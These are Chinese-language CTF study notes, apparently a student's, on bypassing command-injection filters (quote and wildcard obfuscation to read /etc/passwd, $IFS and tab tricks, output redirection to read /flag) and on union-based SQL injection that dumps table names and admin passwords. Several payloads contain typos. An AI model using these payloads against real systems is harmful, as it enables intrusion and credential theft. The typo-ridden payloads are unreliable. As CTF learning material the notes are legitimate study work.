<font style="color:#000000;">;(命令分隔符） 无论前 一个命令 cmd_1是否成功， 都会执行下个命令 </font>

<font style="color:#000000;"></font>

<font style="color:#000000;">在shell中，单/双引号 可以用来定义一个空字符串或保护包含空格或特殊字符的字符串。</font>

<font style="color:#000000;">例如：echo "$"a 会输出 $a, 而 echo $a 会输出变量a的值，当只有"则表示空字符串，shell会忽略它。</font>

<font style="color:#000000;">*(星号） 匹配零个或多个字符。例子： *.txt.</font>

<font style="color:#000000;">?(问号） 匹配单个字符。例子： file?.txt.</font>

<font style="color:#000000;">[](方括号） 匹配方括号内的任意一个字符。例子： file[l-3].txt.</font>

<font style="color:#000000;">{}(大括号）:匹配大括号内的任意一个字符串。例子：  file{1,2,3}.txt.</font>

<font style="color:#000000;">通过组合上述技巧，我们可以用于绕过ctf中一些简单的过滤：</font>

```plain
system ("c''at  /e't'c/pass?d");
```

```plain
system( sem("/???/?at   /e't'c/pass?d");
```

```plain
system (*/???/?at   /e't'c/*ss*');
```

<font style="color:#000000;"></font>

<font style="color:#000000;">在遇到空格被过滤的情况下，通常使用%09也就是TAB的URL编码来绕过，在终端环境下空格被视为一个命令分隔符，本质上由$IFS变量控制，而$IFS的默认值是空格、制表符和换行符，所以我们还可以通过直接键入$IFS来绕过空格过滤。</font>

<font style="color:#000000;"></font>

<font style="color:#000000;">大多数UNIX系统命令从你的终端接受输入并将所产生的输出发送回到您的终端。一个命令通常从一个叫标准输入的地方读取输入，默认情况下，这恰好是你的终端。同样，一个命令通常将其输出写入到标准输出，默认情况下，这也是你的终端——这些是命令有回显的基础。如果希望执行某个命令，但又不希望在屏幕上显示输出结果，那么可以将输出重定向到/dev/null；</font>

<font style="color:#000000;">/dev/null 是一个特殊的文件，写入到它的内容都会被丢弃；如果尝试从该文件读取内容，那么什么也读不到。但是/dev/null文件非常有用，将命令的输出重定向到它，会起到“禁止输出”的效果如果希望屏蔽stdout和stderr，可以这样写：</font>

```plain
$ command  >  /dev/null   2>&1
```

<font style="color:#000000;">如果想要绕过此限制，那么就想方设法的</font><font style="color:#000000;">将cat /flag的输出重定向到一个临时文件中，然后再通过其他命令读取这个临时文件的内容，以达到读取flag的效果</font>



SQL注入语句：

SQL注入大致分为联合注入、布尔盲注、延时盲注和报错注入这次主要是联合注入笔记

万能密码：1

基本注入语句：

```plain
select * from users where username = 'admin' OR '1'='1' and password = 'anything';
```

联合注入:

```plain
select * from person where id = 1 union select 1,2,database(),4,5
```

注意，两者字段数必须相等，判断字段数时，可以使用order by num,一次增大num，直到出现错误就结束来判断字段数是num-1

```plain
select * from person where id = 1 union select 1,2,(select table_name from infomation_schema.tables where table_schema=database() limit 0,1),4,5
```

可以使用limit对查询的对象限定，注意限定列表是从0开始

```plain
select * from person where id = 1 union select 1,2,(select group_concat(table_name) from infomation_schema.tables where table_schema=database() limit 0,1),4,5
```

使用group_concat联合表名也可以

如果是查询具体数据：

```plain
select * from person where id = 1 union select 1,concat(usernamme,0x5c,passward),3,4,5 from admin;
```

或加上限定limit

```plain
select * from person where id = 1 union select 1,concat(usernamme,0x5c,passward),3,4,5 from admin limit 0,2;
```





<font style="color:#000000;">最后，这是一个神奇的链接，能让我们度过一个</font><font style="color:#DF2A3F;">快！乐！充！实！</font><font style="color:#000000;">的寒假：</font>

[<font style="color:#117CEE;">https://ys-api.mihoyo.com/event/download_porter/link/ys_cn/official/pc_default</font>](https://ys-api.mihoyo.com/event/download_porter/link/ys_cn/official/pc_default)

